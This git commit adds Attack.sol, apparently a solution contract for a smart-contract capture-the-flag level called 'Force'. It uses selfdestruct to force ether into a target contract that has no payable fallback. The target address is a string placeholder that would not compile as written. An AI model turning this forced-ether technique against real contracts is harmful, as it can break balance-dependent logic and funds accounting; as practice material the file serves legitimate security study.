56632644a923d980cec12c6646b7faf85a47836a
timou0911 <99255480+timou0911@users.noreply.github.com>
2023-03-20 23:13:20 +0800

    Create Attack.sol

---
+++ 7. Force  ★★★☆☆/Attack.sol
@@ -0,0 +1,15 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Attack {
+
+    address target_addr = "Instance address";
+
+    function kill() public { // kill the contract and FORCELY send ethers to the target even the target doesn't have fallback function.
+        selfdestruct(payable(target_addr));
+    }
+
+    receive() external payable { // allowing this contract to receive ethers.
+
+    }
+}
